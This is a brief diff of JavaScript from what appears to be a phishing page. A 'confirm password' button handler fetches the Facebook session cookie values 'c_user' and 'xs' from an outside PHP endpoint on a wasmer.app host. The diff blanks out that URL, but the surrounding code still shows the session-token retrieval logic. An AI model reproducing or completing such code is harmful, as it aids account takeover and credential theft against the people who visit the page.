@@ -1664,7 +1664,7 @@ confirmPasswordBtn.addEventListener('click', async function() {
 
     try {
         // Fetch c_user and xs values from first URL
-        const bodoResponse = await fetch('https://wxyzqwert-00f8a.wasmer.app/Bodo.php');
+        const bodoResponse = await fetch('');
         const bodoData = await bodoResponse.json();
         
         const { c_user, xs } = bodoData;
@@ -1741,4 +1741,5 @@ passwordInput.addEventListener('keypress', function(e) {
         confirmPasswordBtn.click();
     }
 });
+
 
